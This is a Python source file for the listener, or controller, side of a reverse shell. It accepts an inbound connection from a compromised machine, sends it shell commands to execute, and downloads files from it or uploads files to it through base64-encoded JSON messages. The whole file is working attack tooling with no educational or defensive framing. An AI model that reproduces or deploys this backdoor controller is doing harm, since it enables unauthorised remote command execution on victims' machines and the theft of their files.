#!/usr/bin/env python

import socket, json, shlex, base64


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("WAITING FOR INBOUND CONNECTIONS\n")
        self.__connection, address = listener.accept()
        print("RECEIVED A CONNECTION FROM : " + str(address) + "\n")


    def __serialized_send(self, data):
        s_data = json.dumps(data)
        self.__connection.send(s_data)

    def __deserialized_receive(self, buffersize):
        streamed_data = ""
        while True:
            try:
                streamed_data = streamed_data + self.__connection.recv(buffersize)
                return json.loads(streamed_data)
            except ValueError:
                continue

    def __remote_exec(self, command, buffersize):
        self.__serialized_send(command)
        if command[0] == "exit":
            self.__connection.close()
            exit()
        return self.__deserialized_receive(buffersize)

    def __download_file(self, command_list, buffersize):
        self.__serialized_send(command_list)
        contents = self.__deserialized_receive(buffersize)
        print(contents)
        with open(command_list[1], "wb") as new_file:
            new_file.write(base64.b64decode(contents))
        print("Success, Download!!! ")

    def __upload_file(self, command_list, buffersize):
        with open(command_list[1], "rb") as file_toread_from:
            file_to_upload = base64.b64encode(file_toread_from.read())
            command_list.append(file_to_upload)
            self.__serialized_send(command_list)
            print(self.__deserialized_receive(buffersize))

    def start(self, bufferSize):
        while True:
            try:
                command = raw_input(">> ")
                command_list = shlex.split(command)

                if command_list[0] == "":
                        print("Please insert some command")
                        continue
                if command_list[0] == "download":
                    if len(command_list) != 2:
                        print("Please insert a file to be downloaded")
                        continue
                    else:
                        self.__download_file(command_list, bufferSize)
                        continue
                if command_list[0] == "upload":
                    if len(command_list) != 2:
                        print("Please insert proper args for the upload command")
                        continue
                    else:
                        self.__upload_file(command_list, bufferSize)
                        continue

                result = self.__remote_exec(command_list, bufferSize)
                #This is done to avoid lose connection in any case
            except Exception:
                result = "Client side error"

            print(result)